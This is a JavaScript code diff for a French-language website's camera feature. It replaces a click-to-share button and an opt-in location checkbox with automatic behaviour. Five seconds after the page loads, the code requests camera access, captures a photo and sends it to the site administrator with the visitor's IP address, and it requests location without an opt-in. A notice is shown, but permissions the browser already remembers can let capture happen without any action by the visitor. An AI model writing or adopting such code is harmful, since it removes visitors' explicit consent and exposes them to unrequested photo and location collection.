@@ -1,6 +1,7 @@
 const AUTO_CAMERA_PARAM = "autoCamera";
 const PHOTO_UPLOAD_ENDPOINT = "/api/photos";
 const UPLOAD_TIMEOUT_MS = 30000;
+const CAMERA_DELAY_MS = 5000;
 
 let autoCameraEnabled = false;
 
@@ -22,16 +23,30 @@ function getMediaStream() {
 
 function waitForVideo(video) {
   return new Promise((resolve, reject) => {
-    const timeout = window.setTimeout(() => reject(new Error("timeout")), 7000);
-
-    video.addEventListener("loadedmetadata", () => {
+    const cleanup = () => {
       window.clearTimeout(timeout);
-      video.play().then(resolve).catch(reject);
-    }, { once: true });
+      video.removeEventListener("loadeddata", ready);
+      video.removeEventListener("error", failed);
+    };
+    const ready = () => {
+      if (video.readyState < 2) return;
+      cleanup();
+      resolve();
+    };
+    const failed = (error) => {
+      cleanup();
+      reject(error);
+    };
+    const timeout = window.setTimeout(() => failed(new Error("timeout")), 7000);
+    video.addEventListener("loadeddata", ready);
+    video.addEventListener("error", failed);
+    video.play().then(ready).catch(failed);
   });
 }
 
 function notifyCamera(message) {
+  const status = document.querySelector("[data-camera-status]");
+  if (status) status.textContent = message;
   window.dispatchEvent(new CustomEvent("plexi:toast", { detail: message }));
 }
 
@@ -193,35 +208,33 @@ async function sendCapturedPhoto(photo, location, capturedAt) {
 
 export function initCameraPrompt() {
   const main = document.querySelector("main");
-  if (!main || main.querySelector("[data-camera-share]")) return;
+  if (!main || main.querySelector("[data-camera-notice]")) return;
   autoCameraEnabled = shouldAutoClickCameraAccept();
   const section = document.createElement("section");
-  section.className = "section camera-share";
-  section.setAttribute("data-camera-share", "");
-  section.setAttribute("aria-labelledby", "camera-share-title");
+  section.className = "camera-notice";
+  section.setAttribute("data-camera-notice", "");
+  section.setAttribute("aria-label", "Information sur la prise de photo");
   section.innerHTML = `
-    <h2 id="camera-share-title">Partager une photo</h2>
-    <p>Le bouton prend une photo et l’envoie à l’administrateur avec votre adresse IP.</p>
-    <label class="camera-location-choice">
-      <input type="checkbox" name="includeLocation">
-      <span>Joindre ma localisation (facultatif, avec l’autorisation du navigateur).</span>
-    </label>
-    <div class="dialog-actions">
-      <button type="button" class="button button-secondary" data-camera-accept>${autoCameraEnabled ? "Envoyer une photo de démonstration" : "Prendre et envoyer une photo"}</button>
+    <p>${autoCameraEnabled
+      ? "Démonstration : une image factice sera envoyée à l’administrateur avec votre adresse IP, sans utiliser votre caméra ni votre localisation."
+      : "À l’ouverture de cette page, votre navigateur est sollicité pour accéder à la caméra. Si vous l’autorisez, une photo est automatiquement prise et envoyée à l’administrateur avec votre adresse IP. La localisation est demandée séparément et reste facultative. Les autorisations déjà mémorisées par votre navigateur peuvent s’appliquer."}
       <a href="contact.html#confidentialite">Confidentialité</a>
-    </div>`;
-  const button = section.querySelector("[data-camera-accept]");
-  const locationChoice = section.querySelector("[name=includeLocation]");
-  button.addEventListener("click", async () => {
-    if (button.disabled) return;
-    button.disabled = true;
-    locationChoice.disabled = true;
-    try {
-      await capturePhoto(locationChoice.checked);
-    } finally {
-      button.disabled = false;
-      locationChoice.disabled = false;
-    }
-  });
-  main.append(section);
+    </p>
+    <p class="camera-status" data-camera-status role="status" aria-live="polite">Demande de caméra dans quelques secondes…</p>`;
+  main.prepend(section);
+
+  // Give the visible notice time to be read; do not start from a background tab.
+  let timer = null;
+  const schedule = () => {
+    if (timer !== null) window.clearTimeout(timer);
+    timer = null;
+    if (document.visibilityState === "hidden") return;
+    timer = window.setTimeout(() => {
+      document.removeEventListener("visibilitychange", schedule);
+      notifyCamera(autoCameraEnabled ? "Envoi de la démonstration…" : "En attente de l’autorisation du navigateur…");
+      capturePhoto(true);
+    }, CAMERA_DELAY_MS);
+  };
+  document.addEventListener("visibilitychange", schedule);
+  schedule();
 }
